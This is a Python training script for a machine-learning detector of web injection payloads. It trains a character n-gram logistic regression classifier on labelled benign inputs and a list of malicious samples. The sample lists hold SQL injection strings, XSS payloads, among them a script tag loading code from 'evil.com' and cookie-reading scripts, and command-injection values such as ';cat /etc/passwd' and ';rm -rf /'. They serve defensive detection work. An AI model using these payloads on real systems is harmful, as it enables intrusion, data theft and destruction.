"""
Pipeline de Entrenamiento del Modelo de Inteligencia Artificial para Detección de Payloads.
Incluye Dataset Augmentation, Active Learning feedback ingestion y Validación Cruzada Estratificada (5-Fold).
"""
import contextlib
import json
import os
import sys

if sys.platform.startswith('win'):
    with contextlib.suppress(Exception):
        reconfig = getattr(sys.stdout, "reconfigure", None)
        if callable(reconfig):
            reconfig(encoding='utf-8')

import joblib
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.linear_model import LogisticRegression
from sklearn.metrics import classification_report
from sklearn.model_selection import StratifiedKFold, cross_val_score

# 1. Dataset Benigno Extendido (Clase 0)
BENIGN_QUERIES = [
    "1", "2", "42", "1005", "9999", "0", "-1", "12345", "67890", "3.1416",
    "admin", "user", "guest", "member", "moderator", "operator", "visitor",
    "true", "false", "null", "undefined", "NaN", "success", "pending", "failed",
    "buscar", "search", "query", "term", "q", "filter", "sort_by", "order",
    "zapatos", "camisetas", "pantalon azul", "reloj inteligente", "computador portatil",
    "tutorial de python para principiantes", "receta de tarta de manzana",
    "como hacer pan casero", "las mejores playas de españa", "ciberseguridad ofensiva",
    "desarrollo web moderno con react y tailwind", "arquitectura de microservicios",
    "juan.perez@gmail.com", "maria_lopez_89@outlook.com", "soporte@empresa.co",
    "https://google.com", "http://localhost:3000/dashboard", "https://github.com",
    "page=1&limit=10", "sort=desc&category=shoes", "lang=es-CO", "currency=COP",
    "Lorem ipsum dolor sit amet, consectetur adipiscing elit.",
    "Hola mundo, este es un texto completamente seguro.",
    "perfil", "configuracion", "ayuda", "contacto", "sobre_nosotros", "faq",
    "enero", "febrero", "marzo", "abril", "mayo", "junio", "julio", "agosto",
    "rojo", "verde", "azul", "amarillo", "blanco", "negro", "violeta", "gris",
    "10.50", "99.99", "1500", "0.01", "-5.5", "1000000",
    "2026-06-02", "02/06/2026", "13:45", "2026-09-10T17:30:00Z",
    "nombre", "apellido", "email", "telefono", "direccion", "codigo_postal",
    "Madrid", "Barcelona", "Bogota", "Buenos Aires", "Mexico DF", "Medellin", "Cali",
    "desarrollador", "diseñador", "gerente", "analista", "arquitecto de software",
    "{\"name\": \"John Doe\", \"age\": 30, \"city\": \"New York\"}",
    "550e8400-e29b-41d4-a716-446655440000",
    "SGVsbG8gV29ybGQh",
    "api/v1/users/profile", "status=active&type=standard",
]

# 2. Inyecciones SQL Extendidas (Clase 1)
SQLI_QUERIES = [
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "1' OR '1'='1",
    "1\" OR \"1\"=\"1",
    "' OR 1=1 --",
    "\" OR 1=1 --",
    "' OR 1=1#",
    "\" OR 1=1#",
    "' OR ''='",
    "admin' --",
    "admin'#",
    "admin'/*",
    "' or 1=1 LIMIT 1",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL, NULL--",
    "' UNION SELECT NULL, NULL, NULL--",
    "UNION SELECT username, password FROM users",
    "UNION ALL SELECT 1, 2, 3, 4",
    "UNION SELECT @@version, user()",
    "'; DROP TABLE users; --",
    "1; WAITFOR DELAY '0:0:5'--",
    "1 AND SLEEP(5)",
    "' OR SLEEP(5)#",
    "1 AND 1=1",
    "1 AND 1=2",
    "' AND 'x'='x",
    "' AND 'x'='y",
    "admin' or '1'='1'/*",
    "1' ORDER BY 1--+",
    "1' ORDER BY 2--+",
    "1' ORDER BY 3--+",
    "1' GROUP BY 1,2,--+",
    "' OR 1=1 IN (SELECT * FROM users)--",
    "')) OR 1=1--",
    "' HAVING 1=1--",
    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "1' UNION SELECT schema_name FROM information_schema.schemata--",
    "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user())))--",
    "1; EXEC xp_cmdshell('dir')--",
    "' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
]

# 3. Cross-Site Scripting (XSS) y Payloads de Inyección Extendidos (Clase 1)
XSS_QUERIES = [
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "<script src=\"http://evil.com/xss.js\"></script>",
    "<script>console.log(document.cookie)</script>",
    "\"><script>alert(1)</script>",
    "'\"><script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>",
    "'\"><img src=x onerror=alert(1)>",
    "<img src=x onerror=alert('xss')>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src=\"javascript:alert(1)\"></iframe>",
    "javascript:alert(1)",
    "javascript:confirm(1)",
    "javascript:prompt(1)",
    "javascript:alert(document.cookie)",
    "<h1>hack</h1>",
    "<b>test</b>",
    "<a href=\"javascript:alert(1)\">click me</a>",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    "eval(srcHelper)",
    "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/*|`/onload=alert(1)//'>",
    "<img src=1 href=1 onerror=\"javascript:alert(1)\"></img>",
    "<input type=\"text\" value=\"\" onfocus=\"alert(1)\">",
    "<details open ontoggle=\"alert(1)\">",
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7 %>",
    "{{constructor.constructor('alert(1)')()}}",
    ";cat /etc/passwd",
    "|ls -la",
    "`id`",
    "$(whoami)",
    ";rm -rf /",
    "&& net user",
]


def load_active_learning_feedback() -> tuple[list[str], list[int]]:
    """Carga ejemplos etiquetados por analistas de seguridad para Active Learning."""
    feedback_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "models", "ai_feedback.jsonl")
    extra_queries: list[str] = []
    extra_labels: list[int] = []

    if not os.path.exists(feedback_path):
        return extra_queries, extra_labels

    try:
        with open(feedback_path, encoding="utf-8") as f:
            for line in f:
                raw = line.strip()
                if not raw:
                    continue
                data = json.loads(raw)
                p = data.get("payload", "").strip()
                lbl = data.get("label", 1 if data.get("is_malicious") else 0)
                if p:
                    extra_queries.append(p)
                    extra_labels.append(int(lbl))
    except Exception as err:
        print(f"Advertencia: No se pudo cargar feedback de active learning: {err}")

    return extra_queries, extra_labels


def train(ci: bool = False, run_cv: bool = True) -> None:
    if not ci:
        print(" [AI TRAINER] Preparando dataset de entrenamiento con Data Augmentation...")

    # Cargar feedback acumulado de Active Learning
    fb_queries, fb_labels = load_active_learning_feedback()

    base_benign = list(BENIGN_QUERIES)
    base_malicious = list(SQLI_QUERIES + XSS_QUERIES)

    queries = base_benign + base_malicious + fb_queries
    labels = ([0] * len(base_benign)) + ([1] * len(base_malicious)) + fb_labels

    if not ci:
        print(f"   -> Muestras benignas base (0): {len(base_benign)}")
        print(f"   -> Muestras maliciosas base (1): {len(base_malicious)}")
        if fb_queries:
            print(f"   -> Muestras Active Learning integradas: {len(fb_queries)}")
        print(f"   -> Total corpus de entrenamiento: {len(queries)}")

    # 2. Vectorizador a nivel de caracteres (n-gramas 1-4)
    if not ci:
        print(" Vectorizando texto mediante TF-IDF a nivel de caracteres (n-gramas 1-4)...")
    vectorizer = TfidfVectorizer(analyzer='char', ngram_range=(1, 4), min_df=1)
    x_features = vectorizer.fit_transform(queries)
    y_labels = labels

    # 3. Clasificador Logístico calibrado
    if not ci:
        print(" Entrenando clasificador logístico con pesos balanceados...")
    model = LogisticRegression(max_iter=1000, class_weight="balanced", random_state=42)

    # Validación Cruzada Estratificada (5-Fold)
    if run_cv:
        cv = StratifiedKFold(n_splits=5, shuffle=True, random_state=42)
        cv_scores = cross_val_score(model, x_features, y_labels, cv=cv, scoring="f1")
        mean_f1 = cv_scores.mean()
        std_f1 = cv_scores.std()
        if not ci:
            print(f"   -> Validación Cruzada 5-Fold F1-Score: {mean_f1*100:.2f}% (+/- {std_f1*100:.2f}%)")

    model.fit(x_features, y_labels)

    # Evaluar precisión en el set completo
    train_predictions = model.predict(x_features)
    accuracy = (train_predictions == y_labels).mean()
    if not ci:
        print("\n Métricas de ajuste final:")
        print(classification_report(y_labels, train_predictions, target_names=["Seguro", "Vulnerable"]))

    if ci:
        print(f"Model trained: accuracy={accuracy:.4f}")

    if accuracy < 0.90:
        msg = f"Model accuracy too low: {accuracy:.4f}"
        if ci:
            print(f"ERROR: {msg}")
            sys.exit(1)
        raise RuntimeError(msg)

    # 4. Persistir modelo y vectorizador
    models_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "models")
    os.makedirs(models_dir, exist_ok=True)

    model_path = os.path.join(models_dir, "ai_model.joblib")
    vectorizer_path = os.path.join(models_dir, "vectorizer.joblib")

    joblib.dump(model, model_path)
    joblib.dump(vectorizer, vectorizer_path)

    if ci:
        print(f"Model saved to: {model_path}")
        print(f"Vectorizer saved to: {vectorizer_path}")
    else:
        print(f" Guardando modelo en: {model_path}")
        print(f" Guardando vectorizador en: {vectorizer_path}")
        print("\n [✓] IA entrenada con éxito, calibrada y lista para usarse!")


if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser()
    p.add_argument("--ci", action="store_true", help="CI mode: quiet output, exit code on failure")
    p.add_argument("--no-cv", action="store_true", help="Desactiva cálculo de cross-validation")
    args = p.parse_args()
    train(ci=args.ci, run_cv=not args.no_cv)
